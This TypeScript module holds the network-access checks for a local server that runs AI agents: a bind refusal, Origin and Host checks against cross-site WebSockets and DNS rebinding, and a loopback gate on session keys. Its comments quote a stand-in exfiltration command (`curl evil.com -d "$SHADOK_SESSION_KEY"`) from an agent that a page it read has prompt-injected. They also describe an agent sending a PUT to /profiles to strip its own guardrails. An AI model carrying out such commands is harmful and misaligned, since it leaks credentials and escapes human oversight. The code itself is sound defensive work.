/**
 * Where the server listens, and who may talk to it from a browser.
 *
 * The cockpit runs arbitrary commands on the machine (spawning agents, `sh -c`
 * for cron guards): its only real security boundary is "who can open a
 * connection". This module holds both halves of that boundary, as pure
 * functions — so they are testable without a server.
 *
 * Everything here is pure; the wiring lives in server.ts.
 */

/** Default bind: this machine only. Exposing it to a network is a choice. */
export const DEFAULT_HOST = "127.0.0.1";

/**
 * A bind address that does not leave the machine.
 *
 * `localhost` counts: it resolves to a loopback, and refusing a server that
 * uses it would buy nothing but surprise.
 */
export function isLoopbackHost(host: string): boolean {
  // `[::1]`: the bracketed form, as written in a URL.
  const h = host.trim().toLowerCase().replace(/^\[/, "").replace(/\]$/, "");
  return h === "127.0.0.1" || h === "::1" || h === "localhost";
}

/** The listening interface: `SHADOK_HOST`, else the loopback. */
export function resolveHost(env: NodeJS.ProcessEnv = process.env): string {
  const h = (env.SHADOK_HOST ?? "").trim();
  return h || DEFAULT_HOST;
}

/**
 * Why to refuse to start, or null when the configuration is safe.
 *
 * Listening beyond the loopback WITHOUT a password hands the whole network the
 * right to run commands on this machine. The refusal is deliberately
 * fail-closed: documenting the good practice is not enough when the mistake
 * costs the machine. A `0.0.0.0` stays perfectly legitimate — in a container it
 * is the only value that works — it just requires a password.
 */
export function bindRefusal(host: string, hasPassword: boolean): string | null {
  if (isLoopbackHost(host) || hasPassword) return null;
  return (
    `refusing to start: SHADOK_HOST=${host} exposes the cockpit beyond this machine, with no password.\n` +
    `  The cockpit runs arbitrary commands: anyone who can reach it runs them too.\n` +
    `  → add --password <p> (or SHADOK_GUI_PASSWORD), or drop SHADOK_HOST to listen locally only.\n` +
    `  In a container, SHADOK_HOST=0.0.0.0 is normal: publish the port on the host's loopback\n` +
    `  (-p 127.0.0.1:PORT:PORT), because -p PORT:PORT bypasses ufw/firewalld through Docker's iptables rules.`
  );
}

/** The extra origin allowlist (`SHADOK_ORIGINS`, comma-separated). */
export function parseOrigins(raw: string | undefined): string[] {
  return (raw ?? "")
    .split(",")
    .map((s) => s.trim().toLowerCase().replace(/\/+$/, ""))
    .filter(Boolean);
}

/**
 * May this browser talk to this server?
 *
 * WebSockets are **not subject to the same-origin policy**: without this check,
 * any page the user has open can do `new WebSocket("ws://localhost:3789/ws")`,
 * start an agent and give it orders. The `SameSite=Lax` cookie only covers
 * password-protected instances (and a cross-site WS carries it under neither
 * Lax nor Strict); the default mode has nothing. This check is the real defense.
 *
 * The rule is **same-origin**, not a hardcoded `localhost` list: the cockpit is
 * also reached on a LAN IP or a domain behind a proxy, and a frozen allowlist
 * would close all of those. Comparing `Origin` to the request's `Host` works
 * everywhere and still refuses `evil.com`.
 *
 * **No `Origin` → allowed**, and that is not an oversight: non-browser clients
 * send none — the Telegram bridge, which opens a WS on 127.0.0.1 to our own
 * server, `pilotctl`, the CLI, the scheduler skill. Closing them would break
 * the product for nothing: an attacker able to forge that header already has
 * direct network access, and it is the bind + the password that stop them, not
 * this. This guard only ever addresses browsers, the one client that sends an
 * `Origin` it does not control.
 */
export function originAllowed(
  origin: string | undefined,
  host: string | undefined,
  extraAllowed: string[] = [],
): boolean {
  if (!origin) return true; // non-browser client
  const o = origin.trim().toLowerCase().replace(/\/+$/, "");
  if (extraAllowed.includes(o)) return true;
  if (!host) return false;
  try {
    // `new URL("null")` throws: an opaque origin (sandboxed iframe, file://)
    // therefore falls through to a refusal, which is the right default.
    return new URL(o).host === host.trim().toLowerCase();
  } catch {
    return false;
  }
}

/**
 * A BROWSER on our own origin — the only caller allowed to change a profile's
 * guardrails (deny/allow/secrets/model).
 *
 * Deliberately stricter than `originAllowed`, which lets an Origin-less client
 * through because Telegram, pilotctl, the CLI and the scheduler need that
 * (invariant 11). An agent's shell is exactly such a caller, and that is what
 * we refuse here: without this, any agent could `curl -X PUT /profiles` with
 * `deny: []` and strip its own guardrails.
 *
 * Not a cryptographic boundary — an agent running as the same OS user can forge
 * the header, or rewrite ~/.shadok-ai/profiles.json outright. It removes the
 * accident and takes the capability off the documented surface.
 */
export function browserOrigin(
  origin: string | undefined,
  host: string | undefined,
  extraAllowed: string[] = [],
): boolean {
  if (!origin || !origin.trim()) return false;
  return originAllowed(origin, host, extraAllowed);
}

/**
 * Is this request from a process on THIS machine, reaching us directly?
 *
 * The gate on an agent's session key (`x-shadok-session-key`). That key never
 * expires — by design, invariant 33 — and it is worth the bootstrap admin, so
 * accepted from anywhere it turned one exfiltrated environment variable (an
 * agent talked into `curl evil.com -d "$SHADOK_SESSION_KEY"` by a page it read)
 * into permanent remote admin on every instance reachable from the network,
 * two-factor or not. Agents only ever call their own server on loopback, so
 * that is the only place the key needs to work.
 *
 * Loopback is not enough on its own: a reverse proxy on the same host (nginx in
 * front of a non-Docker install) also connects from 127.0.0.1, on behalf of
 * the whole internet. Such a proxy announces itself with a forwarding header,
 * which a direct local call never sends — so the presence of one means "relayed",
 * whatever the socket says. A proxy configured to send none cannot be told apart
 * from a local caller; the README's TLS recipe sets `X-Forwarded-For`.
 * Pure — unit tested.
 */
export function isLocalCaller(
  remoteAddress: string | undefined,
  headers: Record<string, unknown>,
): boolean {
  if (!remoteAddress) return false;
  const a = remoteAddress.toLowerCase();
  const loopback = a === "::1" || a.startsWith("127.") || a.startsWith("::ffff:127.");
  if (!loopback) return false;
  return !["forwarded", "x-forwarded-for", "x-real-ip", "x-forwarded-host"].some((h) => headers[h] !== undefined);
}

// ── DNS rebinding: the Host allowlist ─────────────────────────────────────

/**
 * The hostname a `Host` header names, lowercased, port and IPv6 brackets
 * stripped — or null when it is not a plain host (spaces, userinfo, a path).
 */
export function hostNameOf(host: string): string | null {
  const h = host.trim().toLowerCase();
  if (!h) return null;
  const v6 = /^\[([0-9a-f:.]+)\](?::\d{1,5})?$/.exec(h);
  if (v6) return v6[1];
  const m = /^([a-z0-9._-]+)(?::\d{1,5})?$/.exec(h);
  return m ? m[1].replace(/\.$/, "") : null;
}

/** An IPv4 or IPv6 literal (as `hostNameOf` returns it). */
function isIpLiteral(name: string): boolean {
  return /^\d{1,3}(\.\d{1,3}){3}$/.test(name) || (name.includes(":") && /^[0-9a-f:.]+$/.test(name));
}

/**
 * `SHADOK_ALLOWED_HOSTS` (or the hosts of `SHADOK_ORIGINS`): comma-separated
 * names, `host:port`, or whole origins — reduced to the bare hostname. A
 * leading dot (`.example.com`) also matches every subdomain; `*` disables the
 * check altogether.
 */
export function parseAllowedHosts(raw: string | undefined): string[] {
  const out: string[] = [];
  for (const part of (raw ?? "").split(",")) {
    const s = part.trim().toLowerCase();
    if (!s) continue;
    if (s === "*") {
      out.push("*");
      continue;
    }
    if (s.startsWith(".")) {
      const n = hostNameOf(s.slice(1));
      if (n) out.push("." + n);
      continue;
    }
    let n: string | null = null;
    if (s.includes("://")) {
      try {
        n = hostNameOf(new URL(s).host);
      } catch {
        n = null;
      }
    } else n = hostNameOf(s.replace(/\/+$/, ""));
    if (n) out.push(n);
  }
  return out;
}

export type HostPolicy = {
  /** A GUI password is set: a rebinding page gets no cookie, so it gets nothing. */
  passwordSet: boolean;
  /** `SHADOK_ALLOWED_HOSTS` — setting it ALSO turns the strict check on under a password. */
  allowedHosts: string[];
  /** Hosts of `SHADOK_ORIGINS` — accepted, but they never turn strictness on. */
  originHosts: string[];
  /** This machine's own name(s) (`os.hostname()`): no attacker can serve a page on it. */
  machineNames: string[];
};

function listed(name: string, list: string[]): boolean {
  return list.some((e) => (e.startsWith(".") ? name === e.slice(1) || name.endsWith(e) : name === e));
}

/**
 * May a request naming this `Host` be served? The defence against DNS
 * rebinding, which `originAllowed` cannot provide: a page on `evil.com` that
 * re-points its own name at 127.0.0.1 sends `Origin: http://evil.com:3789` AND
 * `Host: evil.com:3789` — same-origin by every measure — and, with no password
 * (the local default, where everything is the admin), drives the agents.
 *
 * Rebinding only ever produces a DOMAIN NAME the attacker controls, so the
 * strict rule accepts what such a page cannot be: an IP literal (a browser on
 * an IP sends that IP), `localhost` and `*.localhost` (resolved to loopback by
 * the browser itself, RFC 6761), this machine's own name, and the lists.
 *
 * Strict only when it is NEEDED, so no deployment that exists today breaks:
 * with a password the cookie is bound to the attacker's origin and a rebound
 * page is just an unauthenticated stranger — every Host passes, as before,
 * unless `SHADOK_ALLOWED_HOSTS` asks to tighten. A missing Host is a
 * non-browser client (browsers always send one) and passes, like a missing
 * Origin (invariant 11). Pure — unit tested.
 */
export function hostHeaderAllowed(host: string | undefined, p: HostPolicy): boolean {
  if (p.allowedHosts.includes("*")) return true;
  if (!host || !host.trim()) return true;
  const strict = !p.passwordSet || p.allowedHosts.length > 0;
  if (!strict) return true;
  const name = hostNameOf(host);
  if (!name) return false;
  if (isIpLiteral(name)) return true;
  if (name === "localhost" || name.endsWith(".localhost")) return true;
  if (p.machineNames.some((m) => m && (name === m || name === `${m}.local`))) return true;
  return listed(name, p.allowedHosts) || listed(name, p.originHosts);
}

/** What a refused Host is told — names the knob, since a lockout must be fixable. */
export function hostRefusal(host: string): string {
  const name = hostNameOf(host) ?? host;
  return (
    `host not allowed: ${name}. The cockpit only answers its own names (DNS-rebinding protection). ` +
    `If this is really how you reach it, add it to SHADOK_ALLOWED_HOSTS (comma-separated) and restart.`
  );
}

// ── Who is calling, through a proxy we trust ──────────────────────────────

/** Loopback or a private range: a hop on this machine or its container bridge. */
function isTrustedHop(remote: string): boolean {
  const a = remote.toLowerCase().replace(/^::ffff:/, "");
  if (a === "::1" || a.startsWith("127.")) return true;
  if (/^10\./.test(a) || /^192\.168\./.test(a)) return true;
  const m = /^172\.(\d+)\./.exec(a);
  if (m && +m[1] >= 16 && +m[1] <= 31) return true;
  return /^f[cd][0-9a-f]{2}:/.test(a);
}

function firstHeader(v: unknown): string {
  return Array.isArray(v) ? String(v[0] ?? "") : typeof v === "string" ? v : "";
}

/**
 * The address a login attempt is charged to. The socket's, unless the socket is
 * a trusted hop (loopback, or a private range — the Docker bridge an nginx on
 * the host connects from) carrying `X-Forwarded-For`: then the LAST entry,
 * the one OUR proxy appended (`$proxy_add_x_forwarded_for`). Everything before
 * it is whatever the client claimed and is never trusted. Pure — unit tested.
 */
export function clientAddress(remoteAddress: string | undefined, headers: Record<string, unknown>): string {
  if (!remoteAddress) return "unknown";
  const direct = remoteAddress.toLowerCase().replace(/^::ffff:/, "");
  const xff = firstHeader(headers["x-forwarded-for"]);
  if (!xff || !isTrustedHop(remoteAddress)) return direct;
  const last = xff.split(",").map((s) => s.trim()).filter(Boolean).pop();
  return last ? last.toLowerCase().replace(/^::ffff:/, "") : direct;
}

/**
 * Did the browser reach us over HTTPS? A TLS socket, or a trusted hop saying
 * so in `X-Forwarded-Proto` (first value: the outermost proxy's). Decides the
 * cookies' `Secure` flag. Pure — unit tested.
 */
export function requestIsHttps(
  encrypted: boolean,
  remoteAddress: string | undefined,
  headers: Record<string, unknown>,
): boolean {
  if (encrypted) return true;
  if (!remoteAddress || !isTrustedHop(remoteAddress)) return false;
  return firstHeader(headers["x-forwarded-proto"]).split(",")[0].trim().toLowerCase() === "https";
}
